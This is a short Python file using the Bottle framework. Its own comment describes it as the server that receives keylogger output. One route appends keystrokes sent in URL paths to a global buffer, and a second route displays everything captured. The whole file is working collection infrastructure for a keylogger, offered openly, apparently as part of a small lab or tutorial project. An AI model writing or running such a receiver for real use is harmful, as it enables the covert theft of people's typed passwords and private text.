# the bottle server that recieves the keylog details

from bottle import *

captured = ""

@get('/capture/<keys:path>')
def record(keys):
    global captured
    captured += keys
    return

@get('/view')
def view():
    global captured
    return captured

run(host="localhost", port=8080, debug=True)
